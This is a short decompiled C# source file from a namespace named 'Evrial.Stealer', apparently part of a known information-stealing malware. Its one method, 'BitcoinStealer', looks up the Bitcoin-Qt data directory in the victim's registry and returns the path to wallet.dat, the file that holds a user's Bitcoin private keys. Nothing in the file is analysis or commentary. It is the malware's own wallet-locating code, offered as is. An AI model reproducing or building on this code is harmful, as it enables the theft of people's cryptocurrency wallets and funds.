using System;
using Microsoft.Win32;

namespace Evrial.Stealer
{
	// Token: 0x02000019 RID: 25
	internal static class Wallet
	{
		// Token: 0x06000041 RID: 65 RVA: 0x000040A4 File Offset: 0x000022A4
		public static string BitcoinStealer()
		{
			string result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					result = registryKey.GetValue("strDataDir") + "wallet.dat";
				}
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
